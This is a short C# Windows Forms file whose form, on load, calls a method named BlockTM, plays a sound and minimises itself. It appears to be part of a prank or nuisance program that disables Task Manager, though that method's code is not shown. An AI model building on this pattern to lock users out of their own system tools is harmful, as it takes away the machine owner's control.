using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Net;
using Microsoft.Win32;
using System.IO;

namespace bramerto_rob_2._0
{
    public partial class Cookie : Form
    {
        SoundPlayer sp = new SoundPlayer();

        WebClient wc = new WebClient();



        Random r = new Random();

        Settings s = new Settings();               
        public Cookie()
        {
            InitializeComponent();
            sp.Stream = Properties.Resources.Start;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            s.BlockTM();
            sp.Play(); 
            timer1.Enabled = true;
            timer1.Start();
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            timer1.Enabled = false;
            timer1.Stop();
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
